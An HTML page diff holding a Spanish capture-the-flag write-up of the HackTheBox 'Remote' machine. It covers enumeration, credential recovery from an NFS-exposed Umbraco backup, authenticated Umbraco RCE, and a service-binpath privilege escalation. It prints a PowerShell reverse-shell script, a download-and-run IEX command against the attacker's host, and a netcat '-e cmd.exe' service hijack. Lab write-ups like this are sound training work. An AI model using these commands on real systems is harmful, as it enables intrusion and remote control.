@@ -1,0 +1,746 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>REMOTE HTB MACHINE - 0xpatea’s blog</title>
+<meta name="description" content="REMOTE Recon Nmap PORT      STATE SERVICE       VERSION 21/tcp    open  ftp           Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst:  |_  SYST: Windows_NT 80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp   open  rpcbind       2-4 (RPC #100000) | rpcinfo:  |   program version    port/proto  service |   100000  2,3,4        111/tcp   rpcbind |   100000  2,3,4        111/tcp6  rpcbind |   100000  2,3,4        111/udp   rpcbind |   100000  2,3,4        111/udp6  rpcbind |   100003  2,3         2049/udp   nfs |   100003  2,3         2049/udp6  nfs |   100003  2,3,4       2049/tcp   nfs |   100003  2,3,4       2049/tcp6  nfs |   100005  1,2,3       2049/tcp   mountd |   100005  1,2,3       2049/tcp6  mountd |   100005  1,2,3       2049/udp   mountd |   100005  1,2,3       2049/udp6  mountd |   100021  1,2,3,4     2049/tcp   nlockmgr |   100021  1,2,3,4     2049/tcp6  nlockmgr |   100021  1,2,3,4     2049/udp   nlockmgr |   100021  1,2,3,4     2049/udp6  nlockmgr |   100024  1           2049/tcp   status |   100024  1           2049/tcp6  status |   100024  1           2049/udp   status |_  100024  1           2049/udp6  status 135/tcp   open  msrpc         Microsoft Windows RPC 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds? 2049/tcp  open  mountd        1-3 (RPC #100005) 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open  msrpc         Microsoft Windows RPC 49665/tcp open  msrpc         Microsoft Windows RPC 49666/tcp open  msrpc         Microsoft Windows RPC 49667/tcp open  msrpc         Microsoft Windows RPC 49678/tcp open  msrpc         Microsoft Windows RPC 49679/tcp open  msrpc         Microsoft Windows RPC 49680/tcp open  msrpc         Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: 4m25s | smb2-security-mode:  |   2.02:  |_    Message signing enabled but not required | smb2-time:  |   date: 2021-07-09T21:28:21 |_  start_date: N/A  A simple vista, me llama la atención, el puerto 21, ya que nos permite el logueo anónimo, también tenemos una página web y SMB, además podemos ver que bajo el puerto 111 está corriendo NFS.  ## Enumeración FTP - port 21 (TCP)  Tras ver que el puerto 21 está abierto y que nos permite el logueo anónimo, probamos a entrar y echar un vistazo a ver si hay algo que nos llame la atención en él, pero no hay nada.  Enumeración Web - port 80 (TCP) Al acceder vemos una “tienda” que ofrece productos de Umbraco . Tras navegar por ella y buscar algún parámetro extraño y revisar el código fuente, no observo nada que me llame la atención. Busco en google “Umbraco” y aparece que es un CMS. Tras haber estado cotilleando un rato por la web y no haber encontrado nada, procedo a enumerar la web con herramientas básicas.   Nikto jagelito ~$ nikto -h http://remote.htb - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP:          10.10.10.180 + Target Hostname:    remote.htb + Target Port:        80 + Start Time:         2021-07-12 01:07:18 (GMT2) --------------------------------------------------------------------------- + Server: No banner retrieved + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Server banner has changed from &#39;&#39; to &#39;Microsoft-IIS/10.0&#39; which may suggest a WAF, load balancer or proxy is in place + No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs) + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + OSVDB-3092: /home/: This might be interesting... + OSVDB-3092: /intranet/: This might be interesting... + /umbraco/ping.aspx: Umbraco ping page found + 7785 requests: 0 error(s) and 7 item(s) reported on remote host + End Time:           2021-07-12 01:14:14 (GMT2) (416 seconds) ---------------------------------------------------------------------------  Nikto nos avisa que existe un directorio llamado Umbraco , al acceder a él vemos que realmente el CMS que se está utilizando es este.   Dirsearch jagelito ~$ dirsearch -u http://remote.htb -x400,404    _|. _ _  _  _  _ _|_    v0.4.1  (_||| _) (/_(_|| (_| )  Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877  Target: http://remote.htb/  [11:31:44] Starting:  [11:31:45] 403 -  312B  - /%2e%2e//google.com [11:31:45] 200 -    2KB - /.aspx [11:31:55] 302 -  126B  - /INSTALL  -&gt;  /umbraco/ [11:31:55] 302 -  126B  - /Install  -&gt;  /umbraco/ [11:31:58] 403 -    2KB - /Trace.axd [11:32:00] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd [11:32:02] 200 -    2KB - /about-us [11:32:23] 200 -    2KB - /blog [11:32:23] 200 -    2KB - /blog/ [11:32:29] 200 -    3KB - /contact.aspx [11:32:29] 200 -    3KB - /contact [11:32:32] 200 -    2KB - /default.aspx [11:32:40] 200 -    2KB - /home [11:32:40] 200 -    2KB - /home.aspx [11:32:42] 302 -  126B  - /install/  -&gt;  /umbraco/ [11:32:42] 302 -  126B  - /install  -&gt;  /umbraco/ [11:32:42] 200 -    1KB - /intranet [11:32:48] 500 -    3KB - /master/ [11:32:54] 200 -    2KB - /people [11:33:04] 500 -    3KB - /product [11:33:04] 200 -    2KB - /products [11:33:04] 200 -    2KB - /products.aspx  jagelito ~$ dirsearch -u http://10.10.10.180/umbraco -x400,404,403    _|. _ _  _  _  _ _|_    v0.4.1  (_||| _) (/_(_|| (_| )  Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877  Target: http://10.10.10.180/umbraco/  [11:36:22] Starting:  [11:36:23] 301 -  154B  - /umbraco/js  -&gt;  http://10.10.10.180/umbraco/js/ [11:36:26] 301 -  159B  - /umbraco/INSTALL  -&gt;  http://10.10.10.180/umbraco/INSTALL/ [11:36:26] 301 -  159B  - /umbraco/Install  -&gt;  http://10.10.10.180/umbraco/Install/ [11:36:26] 301 -  158B  - /umbraco/Search  -&gt;  http://10.10.10.180/umbraco/Search/ [11:36:29] 301 -  159B  - /umbraco/actions  -&gt;  http://10.10.10.180/umbraco/actions/ [11:36:34] 200 -    2KB - /umbraco/application [11:36:34] 200 -    3KB - /umbraco/application/logs/ [11:36:34] 200 -    3KB - /umbraco/application/ [11:36:34] 200 -    3KB - /umbraco/application/cache/ [11:36:34] 301 -  158B  - /umbraco/assets  -&gt;  http://10.10.10.180/umbraco/assets/ [11:36:37] 301 -  158B  - /umbraco/config  -&gt;  http://10.10.10.180/umbraco/config/ [11:36:38] 301 -  161B  - /umbraco/dashboard  -&gt;  http://10.10.10.180/umbraco/dashboard/ [11:36:38] 200 -    4KB - /umbraco/default [11:36:38] 301 -  161B  - /umbraco/developer  -&gt;  http://10.10.10.180/umbraco/developer/ [11:36:41] 301 -  159B  - /umbraco/install  -&gt;  http://10.10.10.180/umbraco/install/ [11:36:42] 301 -  155B  - /umbraco/lib  -&gt;  http://10.10.10.180/umbraco/lib/ [11:36:42] 301 -  163B  - /umbraco/lib/tinymce  -&gt;  http://10.10.10.180/umbraco/lib/tinymce/ [11:36:43] 200 -  657B  - /umbraco/logout.aspx [11:36:43] 301 -  159B  - /umbraco/members  -&gt;  http://10.10.10.180/umbraco/members/ [11:36:46] 301 -  159B  - /umbraco/plugins  -&gt;  http://10.10.10.180/umbraco/plugins/ [11:36:48] 301 -  158B  - /umbraco/search  -&gt;  http://10.10.10.180/umbraco/search/ [11:36:48] 301 -  160B  - /umbraco/settings  -&gt;  http://10.10.10.180/umbraco/settings/ [11:36:52] 301 -  157B  - /umbraco/views  -&gt;  http://10.10.10.180/umbraco/views/  Tras estar un rato “cotilleando” y fuzeando la web, no encuentro nada interesante, ni credenciales que se hayan podido dejar sin querer en algún archivo. Pruebo credenciales por defecto en la página de logueo de Umbraco, pero nada funciona.  Enumeración SMB - port 139,445 (TCP) Al ver estos puertos abiertos pruebo a enumerar algún recurso que se esté compartiendo bajo una null session, pero no nos deja acceder  jagelito ~$ crackmapexec smb --shares 10.10.10.180 -u &#39;&#39; -p &#39;&#39; SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False) SMB         10.10.10.180    445    REMOTE           [-] remote\: STATUS_ACCESS_DENIED  SMB         10.10.10.180    445    REMOTE           [-] Error enumerating shares: Error occurs while reading from remote(104)   Enumeración NFS - port 111 (TCP) Al ver que bajo el puerto 111 está corriendo NFS (Network File System), pruebo a ver si aquí hay algún recurso compartido. jagelito ~$ showmount -e remote.htb Export list for remote.htb: /site_backups (everyone)  jagelito ~$ sudo mount -t nfs 10.10.10.180:/site_backups content/nfs/backup_mnt/ -nolock  jagelito ~$ ls -la content/nfs/backup_mnt/ total 123 drwx------ 2 nobody   4294967294  4096 Feb 23  2020 . drwxr-xr-x 3 jagelito jagelito    4096 Jul  9 23:47 .. drwx------ 2 nobody   4294967294    64 Feb 20  2020 App_Browsers drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Data drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Plugins drwx------ 2 nobody   4294967294    64 Feb 20  2020 aspnet_client drwx------ 2 nobody   4294967294 49152 Feb 20  2020 bin drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Config drwx------ 2 nobody   4294967294    64 Feb 20  2020 css -rwx------ 1 nobody   4294967294   152 Nov  1  2018 default.aspx -rwx------ 1 nobody   4294967294    89 Nov  1  2018 Global.asax drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Media drwx------ 2 nobody   4294967294    64 Feb 20  2020 scripts drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Umbraco drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Umbraco_Client drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Views -rwx------ 1 nobody   4294967294 28539 Feb 20  2020 Web.config  Por suerte, se está compartiendo un backup del sitio Web, por lo que tras googlear un poco dónde se quedan guardadas las credenciales de Umbraco, encontramos el archivo Umbraco.sdf en el directorio App_Data . Al inspeccionar este archivo nos muestra que contiene “data”. Se trata de un archivo que contiene la base de datos. Al hacerle un simple cat se muestran carácteres extraños. Se podría usar algún programa para tratar de visualizar el contenido, pero antes de estar utilizando programas, intento ir de más simple a más complejo, así que le hago un strings para comprobar qué se puede sacar en claro de este archivo. jagelito ~$ file Umbraco.sdf  Umbraco.sdf: data  jagelito ~$ strings Umbraco.sdf | head Administratoradmindefaulten-US Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 @{pv qpkaj  Encontramos que aparecen dos usuarios con lo que parecen dos contraseñas hasheadas.                 Usuario       Hash       Contraseña                       admin@htb.local       b8be16afba8c314ad33d812f22a04991b90e2aaa       baconandcheese                 smith@htb.local       ljxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=       N/A             Explotación Umbraco CMS Una vez que tenemos un usuario y una contraseña en texto claro, pruebo a acceder a Umbraco y conseguimos loguearnos como administrator. Conseguimos saber qué versión está corriendo.   Una vez sabemos la versión, buscamos exploits disponibles de manera local para tratar de conseguir RCE. Nos creamos un mirror del exploit y le pasamos los parámetros que nos pide. jagelito ~$ searchsploit Umbraco 7.12.4 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title                                                                                                                                              |  Path ------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                  | aspx/webapps/46153.py Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                  | aspx/webapps/49488.py ------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------  jagelito ~$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c whoami iis apppool\defaultapppool  Tenemos RCE dentro de la máquina, así que ahora se trata de conseguir una shell en ella. Creamos una reverse shell y abrimos un servidor http con python para poder transferirla a la máquina Para crear nuestra reverse shell uso este script: $client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.10&quot;,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()   jagelito ~$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.12:8000/rev.ps1&#39;)&quot;  jagelito ~$ sudo python3 -m http.server  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.180 - - [12/Jul/2021 12:23:26] &quot;GET /rev.ps1 HTTP/1.1&quot; 200 -  Una vez transferida la shell a la máquina victima, abrimos el puerto a la escucha con netcat jagelito ~$ sudo nc -lvnp 443 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49709 PS C:\windows\system32\inetsrv&gt; whoami iis apppool\defaultapppool    Priv. Esc. user.txt PS C:\windows\system32\inetsrv&gt; cd C:\ PS C:\&gt; cd Users PS C:\Users&gt; dir       Directory: C:\Users   Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-----        2/19/2020   3:12 PM                .NET v2.0                                                              d-----        2/19/2020   3:12 PM                .NET v2.0 Classic                                                      d-----        2/19/2020   3:12 PM                .NET v4.5                                                              d-----        2/19/2020   3:12 PM                .NET v4.5 Classic                                                      d-----        7/11/2021   7:07 PM                Administrator                                                          d-----        2/19/2020   3:12 PM                Classic .NET AppPool                                                   d-r---        2/20/2020   2:42 AM                Public                                                                  PS C:\Users&gt; cd Public  PS C:\Users\Public&gt; dir     Directory: C:\Users\Public   Mode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-r---        2/19/2020   3:03 PM                Documents                                                              d-r---        9/15/2018   3:19 AM                Downloads                                                              d-r---        9/15/2018   3:19 AM                Music                                                                  d-r---        9/15/2018   3:19 AM                Pictures                                                               d-r---        9/15/2018   3:19 AM                Videos                                                                 -ar---        7/11/2021   7:07 PM             34 user.txt                                                                 PS C:\Users\Public&gt; type user.txt b200d........................   IIS -&gt; Administrator Comecemos con una enumeración del sistema con winPEAS. Nos lo transferimos a la máquina y lo ejecutamos. PS C:\Users\Public&gt; whoami /priv  PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                               State    ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled SeAuditPrivilege              Generate security audits                  Disabled SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled  SeImpersonatePrivilege        Impersonate a client after authentication Enabled  SeCreateGlobalPrivilege       Create global objects                     Enabled  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  PS C:\Users\Public&gt; cd C:/Windows/TEMP  PS C:/Windows/TEMP&gt; iwr -Uri http://10.10.14.12:8000/winPEASx64.exe -Outfile win.exe  PS C:/Windows/TEMP&gt; ./win.exe ...[snip]...    [+] Modifiable Services                                                                                                                                                                       [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                        LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:                                                                                                                                                    UsoSvc: AllAccess, Start   	 ...[snip]...   Encontramos el servicio UsoSvc, siguiendo la guía de https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md, encontramos que podemos conseguir escalar al usuario Administrator con el CVE-2019-1322. Se trata de una incorrecta administración de permisos en un servicio corriendo bajo NT AUTHORITY/SYSTEM, permitiéndonos reemplazar el binario por netcat y así obtener una reverse como Administrador.  PS C:\Windows\TEMP&gt; iwr -Uri http://10.10.14.12:8000/nc64.exe -Outfile nc.exe   PS C:\Windows\TEMP&gt; sc.exe stop UsoSvc                                                                                                 SERVICE_NAME: UsoSvc                                                                                    TYPE               : 30  WIN32                                                                  STATE              : 3  STOP_PENDING                                                                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)                         WIN32_EXIT_CODE    : 0  (0x0)                                                                   SERVICE_EXIT_CODE  : 0  (0x0)                                                                   CHECKPOINT         : 0x3                                                                        WAIT_HINT          : 0x7530   PS C:\Windows\TEMP&gt; sc.exe config UsoSvc binpath=&quot;C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe&quot;  [SC] ChangeServiceConfig SUCCESS  PS C:\Windows\TEMP&gt; sc.exe qc usosvc SERVICE_NAME: usosvc                                                                                    TYPE               : 20  WIN32_SHARE_PROCESS                                                    START_TYPE         : 2   AUTO_START  (DELAYED)                                                  ERROR_CONTROL      : 1   NORMAL                                                                 BINARY_PATH_NAME   : C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe                           LOAD_ORDER_GROUP   :                                                                            TAG                : 0                                                                          DISPLAY_NAME       : Update Orchestrator Service                                                DEPENDENCIES       : rpcss                                                                      SERVICE_START_NAME : LocalSystem   		 PS C:\Windows\TEMP&gt; sc.exe start UsoSvc    En otra terminal, ponemos un puerto a la escucha.  jagelito ~$ sudo rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.10.180] 49870 Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved.  whoami nt authority\system  PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt 386bd................  Máquina pwneada. ">
+
+
+  <meta name="author" content="0xpatea">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="0xpatea's blog">
+<meta property="og:title" content="REMOTE HTB MACHINE">
+<meta property="og:url" content="http://localhost:4000/ctf%20writeups/remote-htb/">
+
+
+  <meta property="og:description" content="REMOTE Recon Nmap PORT      STATE SERVICE       VERSION 21/tcp    open  ftp           Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst:  |_  SYST: Windows_NT 80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp   open  rpcbind       2-4 (RPC #100000) | rpcinfo:  |   program version    port/proto  service |   100000  2,3,4        111/tcp   rpcbind |   100000  2,3,4        111/tcp6  rpcbind |   100000  2,3,4        111/udp   rpcbind |   100000  2,3,4        111/udp6  rpcbind |   100003  2,3         2049/udp   nfs |   100003  2,3         2049/udp6  nfs |   100003  2,3,4       2049/tcp   nfs |   100003  2,3,4       2049/tcp6  nfs |   100005  1,2,3       2049/tcp   mountd |   100005  1,2,3       2049/tcp6  mountd |   100005  1,2,3       2049/udp   mountd |   100005  1,2,3       2049/udp6  mountd |   100021  1,2,3,4     2049/tcp   nlockmgr |   100021  1,2,3,4     2049/tcp6  nlockmgr |   100021  1,2,3,4     2049/udp   nlockmgr |   100021  1,2,3,4     2049/udp6  nlockmgr |   100024  1           2049/tcp   status |   100024  1           2049/tcp6  status |   100024  1           2049/udp   status |_  100024  1           2049/udp6  status 135/tcp   open  msrpc         Microsoft Windows RPC 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 445/tcp   open  microsoft-ds? 2049/tcp  open  mountd        1-3 (RPC #100005) 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open  msrpc         Microsoft Windows RPC 49665/tcp open  msrpc         Microsoft Windows RPC 49666/tcp open  msrpc         Microsoft Windows RPC 49667/tcp open  msrpc         Microsoft Windows RPC 49678/tcp open  msrpc         Microsoft Windows RPC 49679/tcp open  msrpc         Microsoft Windows RPC 49680/tcp open  msrpc         Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: 4m25s | smb2-security-mode:  |   2.02:  |_    Message signing enabled but not required | smb2-time:  |   date: 2021-07-09T21:28:21 |_  start_date: N/A  A simple vista, me llama la atención, el puerto 21, ya que nos permite el logueo anónimo, también tenemos una página web y SMB, además podemos ver que bajo el puerto 111 está corriendo NFS.  ## Enumeración FTP - port 21 (TCP)  Tras ver que el puerto 21 está abierto y que nos permite el logueo anónimo, probamos a entrar y echar un vistazo a ver si hay algo que nos llame la atención en él, pero no hay nada.  Enumeración Web - port 80 (TCP) Al acceder vemos una “tienda” que ofrece productos de Umbraco . Tras navegar por ella y buscar algún parámetro extraño y revisar el código fuente, no observo nada que me llame la atención. Busco en google “Umbraco” y aparece que es un CMS. Tras haber estado cotilleando un rato por la web y no haber encontrado nada, procedo a enumerar la web con herramientas básicas.   Nikto jagelito ~$ nikto -h http://remote.htb - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP:          10.10.10.180 + Target Hostname:    remote.htb + Target Port:        80 + Start Time:         2021-07-12 01:07:18 (GMT2) --------------------------------------------------------------------------- + Server: No banner retrieved + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Server banner has changed from &#39;&#39; to &#39;Microsoft-IIS/10.0&#39; which may suggest a WAF, load balancer or proxy is in place + No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs) + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + OSVDB-3092: /home/: This might be interesting... + OSVDB-3092: /intranet/: This might be interesting... + /umbraco/ping.aspx: Umbraco ping page found + 7785 requests: 0 error(s) and 7 item(s) reported on remote host + End Time:           2021-07-12 01:14:14 (GMT2) (416 seconds) ---------------------------------------------------------------------------  Nikto nos avisa que existe un directorio llamado Umbraco , al acceder a él vemos que realmente el CMS que se está utilizando es este.   Dirsearch jagelito ~$ dirsearch -u http://remote.htb -x400,404    _|. _ _  _  _  _ _|_    v0.4.1  (_||| _) (/_(_|| (_| )  Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877  Target: http://remote.htb/  [11:31:44] Starting:  [11:31:45] 403 -  312B  - /%2e%2e//google.com [11:31:45] 200 -    2KB - /.aspx [11:31:55] 302 -  126B  - /INSTALL  -&gt;  /umbraco/ [11:31:55] 302 -  126B  - /Install  -&gt;  /umbraco/ [11:31:58] 403 -    2KB - /Trace.axd [11:32:00] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd [11:32:02] 200 -    2KB - /about-us [11:32:23] 200 -    2KB - /blog [11:32:23] 200 -    2KB - /blog/ [11:32:29] 200 -    3KB - /contact.aspx [11:32:29] 200 -    3KB - /contact [11:32:32] 200 -    2KB - /default.aspx [11:32:40] 200 -    2KB - /home [11:32:40] 200 -    2KB - /home.aspx [11:32:42] 302 -  126B  - /install/  -&gt;  /umbraco/ [11:32:42] 302 -  126B  - /install  -&gt;  /umbraco/ [11:32:42] 200 -    1KB - /intranet [11:32:48] 500 -    3KB - /master/ [11:32:54] 200 -    2KB - /people [11:33:04] 500 -    3KB - /product [11:33:04] 200 -    2KB - /products [11:33:04] 200 -    2KB - /products.aspx  jagelito ~$ dirsearch -u http://10.10.10.180/umbraco -x400,404,403    _|. _ _  _  _  _ _|_    v0.4.1  (_||| _) (/_(_|| (_| )  Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877  Target: http://10.10.10.180/umbraco/  [11:36:22] Starting:  [11:36:23] 301 -  154B  - /umbraco/js  -&gt;  http://10.10.10.180/umbraco/js/ [11:36:26] 301 -  159B  - /umbraco/INSTALL  -&gt;  http://10.10.10.180/umbraco/INSTALL/ [11:36:26] 301 -  159B  - /umbraco/Install  -&gt;  http://10.10.10.180/umbraco/Install/ [11:36:26] 301 -  158B  - /umbraco/Search  -&gt;  http://10.10.10.180/umbraco/Search/ [11:36:29] 301 -  159B  - /umbraco/actions  -&gt;  http://10.10.10.180/umbraco/actions/ [11:36:34] 200 -    2KB - /umbraco/application [11:36:34] 200 -    3KB - /umbraco/application/logs/ [11:36:34] 200 -    3KB - /umbraco/application/ [11:36:34] 200 -    3KB - /umbraco/application/cache/ [11:36:34] 301 -  158B  - /umbraco/assets  -&gt;  http://10.10.10.180/umbraco/assets/ [11:36:37] 301 -  158B  - /umbraco/config  -&gt;  http://10.10.10.180/umbraco/config/ [11:36:38] 301 -  161B  - /umbraco/dashboard  -&gt;  http://10.10.10.180/umbraco/dashboard/ [11:36:38] 200 -    4KB - /umbraco/default [11:36:38] 301 -  161B  - /umbraco/developer  -&gt;  http://10.10.10.180/umbraco/developer/ [11:36:41] 301 -  159B  - /umbraco/install  -&gt;  http://10.10.10.180/umbraco/install/ [11:36:42] 301 -  155B  - /umbraco/lib  -&gt;  http://10.10.10.180/umbraco/lib/ [11:36:42] 301 -  163B  - /umbraco/lib/tinymce  -&gt;  http://10.10.10.180/umbraco/lib/tinymce/ [11:36:43] 200 -  657B  - /umbraco/logout.aspx [11:36:43] 301 -  159B  - /umbraco/members  -&gt;  http://10.10.10.180/umbraco/members/ [11:36:46] 301 -  159B  - /umbraco/plugins  -&gt;  http://10.10.10.180/umbraco/plugins/ [11:36:48] 301 -  158B  - /umbraco/search  -&gt;  http://10.10.10.180/umbraco/search/ [11:36:48] 301 -  160B  - /umbraco/settings  -&gt;  http://10.10.10.180/umbraco/settings/ [11:36:52] 301 -  157B  - /umbraco/views  -&gt;  http://10.10.10.180/umbraco/views/  Tras estar un rato “cotilleando” y fuzeando la web, no encuentro nada interesante, ni credenciales que se hayan podido dejar sin querer en algún archivo. Pruebo credenciales por defecto en la página de logueo de Umbraco, pero nada funciona.  Enumeración SMB - port 139,445 (TCP) Al ver estos puertos abiertos pruebo a enumerar algún recurso que se esté compartiendo bajo una null session, pero no nos deja acceder  jagelito ~$ crackmapexec smb --shares 10.10.10.180 -u &#39;&#39; -p &#39;&#39; SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False) SMB         10.10.10.180    445    REMOTE           [-] remote\: STATUS_ACCESS_DENIED  SMB         10.10.10.180    445    REMOTE           [-] Error enumerating shares: Error occurs while reading from remote(104)   Enumeración NFS - port 111 (TCP) Al ver que bajo el puerto 111 está corriendo NFS (Network File System), pruebo a ver si aquí hay algún recurso compartido. jagelito ~$ showmount -e remote.htb Export list for remote.htb: /site_backups (everyone)  jagelito ~$ sudo mount -t nfs 10.10.10.180:/site_backups content/nfs/backup_mnt/ -nolock  jagelito ~$ ls -la content/nfs/backup_mnt/ total 123 drwx------ 2 nobody   4294967294  4096 Feb 23  2020 . drwxr-xr-x 3 jagelito jagelito    4096 Jul  9 23:47 .. drwx------ 2 nobody   4294967294    64 Feb 20  2020 App_Browsers drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Data drwx------ 2 nobody   4294967294  4096 Feb 20  2020 App_Plugins drwx------ 2 nobody   4294967294    64 Feb 20  2020 aspnet_client drwx------ 2 nobody   4294967294 49152 Feb 20  2020 bin drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Config drwx------ 2 nobody   4294967294    64 Feb 20  2020 css 